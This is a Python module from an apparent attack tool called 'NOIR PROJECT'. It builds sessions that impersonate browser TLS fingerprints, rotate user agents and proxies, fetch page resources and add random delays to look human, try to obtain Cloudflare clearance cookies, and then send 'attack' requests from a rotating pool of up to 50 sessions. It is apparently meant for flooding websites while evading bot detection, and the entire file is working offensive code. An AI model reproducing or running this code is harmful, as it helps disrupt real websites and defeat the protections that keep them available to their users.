"""
NOIR PROJECT v6.0 - Smart Session Flow (Browser Emulation 2.0)
Mimics human browsing patterns: landing page -> resource waterfall -> attack
"""
import asyncio
import time
import random
import re
import logging
from typing import List, Dict, Optional, Tuple
from urllib.parse import urljoin, urlparse
from evasion.header_engine import build_advanced_headers, build_minimal_headers
from evasion.ua_pool import get_random_ua
from evasion.tls_fingerprint import get_curl_impersonate

logger = logging.getLogger("smart_session")

# Resource patterns to extract from HTML
RESOURCE_PATTERNS = {
    "css": re.compile(r'<link[^>]+href=["\']([^"\']+\.css[^"\']*)["\']', re.IGNORECASE),
    "js": re.compile(r'<script[^>]+src=["\']([^"\']+\.js[^"\']*)["\']', re.IGNORECASE),
    "img": re.compile(r'<img[^>]+src=["\']([^"\']+)["\']', re.IGNORECASE),
}

# Think time distribution (Gaussian jitter)
THINK_TIME_MEAN = 500  # ms
THINK_TIME_STD = 300   # ms


class SmartSession:
    """
    Smart session that mimics human browsing behavior:
    1. Visit landing page
    2. Parse and fetch static resources (CSS/JS/IMG)
    3. Simulate JS challenge / wait
    4. Execute attack requests
    """

    def __init__(self, impersonate: str = "chrome134"):
        self.impersonate = impersonate
        self.session = None
        self.cookies = {}
        self.resources_fetched = 0
        self.is_initialized = False

    async def initialize(self, proxy: Optional[str] = None):
        """Initialize session with browser-like TLS fingerprint"""
        from curl_cffi.requests import AsyncSession
        kwargs = {"impersonate": self.impersonate, "timeout": 10}
        if proxy:
            kwargs["proxies"] = {"all": proxy}
        self.session = AsyncSession(**kwargs)
        self.is_initialized = True

    async def close(self):
        """Close session"""
        if self.session:
            try:
                await self.session.close()
            except Exception:
                pass

    async def visit_landing(self, url: str) -> Optional[str]:
        """Visit landing page and return HTML content"""
        if not self.is_initialized:
            await self.initialize()

        try:
            headers = build_advanced_headers(url)
            resp = await self.session.get(url, headers=headers, timeout=10)
            self.cookies = dict(self.session.cookies)
            await self._think()
            return resp.text if resp.status_code == 200 else None
        except Exception as e:
            logger.debug(f"Landing page visit failed: {e}")
            return None

    async def fetch_resources(self, base_url: str, html: str):
        """Parse HTML and fetch static resources sequentially"""
        if not html:
            return

        # Extract resources
        for res_type, pattern in RESOURCE_PATTERNS.items():
            matches = pattern.findall(html)
            # Limit resources per type to avoid detection
            for match in matches[:random.randint(1, 3)]:
                resource_url = urljoin(base_url, match)
                try:
                    headers = build_advanced_headers(resource_url)
                    await self.session.get(resource_url, headers=headers, timeout=5)
                    self.resources_fetched += 1
                    await self._think()
                except Exception:
                    pass

    async def solve_challenge(self, url: str) -> bool:
        """Simulate solving JS challenge (Turnstile/Cloudflare)"""
        if not self.is_initialized:
            await self.initialize()

        try:
            # Visit challenge page
            headers = build_advanced_headers(url)
            resp = await self.session.get(url, headers=headers, timeout=10)

            # Check for cf_clearance cookie
            if "cf_clearance" in dict(self.session.cookies):
                logger.info("Challenge solved: cf_clearance obtained")
                return True

            # Wait for challenge to complete (simulated)
            await asyncio.sleep(random.uniform(2, 5))

            # Retry
            resp = await self.session.get(url, headers=headers, timeout=10)
            return "cf_clearance" in dict(self.session.cookies)
        except Exception as e:
            logger.debug(f"Challenge solve failed: {e}")
            return False

    async def execute_attack(self, url: str, method: str = "GET", data: Optional[str] = None) -> Tuple[int, float]:
        """Execute attack request with smart session"""
        if not self.is_initialized:
            await self.initialize()

        try:
            headers = build_advanced_headers(url, method)
            start = time.time()

            if method == "POST" and data:
                resp = await self.session.post(url, headers=headers, data=data, timeout=10)
            else:
                resp = await self.session.get(url, headers=headers, timeout=10)

            elapsed = (time.time() - start) * 1000
            self.cookies = dict(self.session.cookies)
            await self._think()
            return resp.status_code, elapsed
        except Exception as e:
            elapsed = (time.time() - start) * 1000
            return 0, elapsed

    async def _think(self):
        """Add Gaussian jitter between requests"""
        think_time = max(50, random.gauss(THINK_TIME_MEAN, THINK_TIME_STD))
        await asyncio.sleep(think_time / 1000)


class SmartSessionPool:
    """Pool of smart sessions with automatic rotation"""

    def __init__(self, max_sessions: int = 50):
        self.max_sessions = max_sessions
        self._sessions: List[SmartSession] = []
        self._index = 0

    async def get_session(self, proxy: Optional[str] = None) -> SmartSession:
        """Get or create a smart session"""
        if self._index >= len(self._sessions):
            session = SmartSession(impersonate=get_curl_impersonate())
            await session.initialize(proxy)
            self._sessions.append(session)

        session = self._sessions[self._index % len(self._sessions)]
        self._index += 1
        return session

    async def close_all(self):
        """Close all sessions"""
        for session in self._sessions:
            await session.close()
        self._sessions.clear()
